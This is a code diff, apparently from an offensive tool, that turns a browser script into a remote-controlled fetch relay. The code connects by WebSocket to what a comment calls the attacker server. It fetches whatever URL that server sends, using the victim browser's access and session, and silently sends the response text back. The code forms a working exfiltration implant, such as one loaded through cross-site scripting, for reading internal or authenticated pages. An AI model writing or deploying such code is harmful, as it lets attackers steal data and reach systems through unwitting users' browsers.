@@ -5,17 +5,19 @@
         // TODO build file using a config containing the attacker server
         const ws = new WebSocket('ws://localhost:8080/ws')
 
-        ws.onopen = (e) => {
-            console.log('Open')
-            console.log(e)
+        ws.onmessage = (msg) => {
+            const msgobj = JSON.parse(msg.data)
+            const url = msgobj.url
+            // TODO make a request object to allow for more configurable requests
+            fetch(url)
+                .then(res => {
+                    res.text()
+                        .then(restext => {
+                            ws.send(JSON.stringify(restext))
+                        })
+                        .catch(err => null) // Silently error TODO send error back to server
+                })
+                .catch(err => null) // Silently error TODO send error back to server
         }
-
-        ws.onmessage = (msg, a) => {
-            document.write(JSON.stringify(msg.data))
-        }
-
-        setInterval(() => {
-            ws.send('hi')
-        }, 500)
     })()
 })()
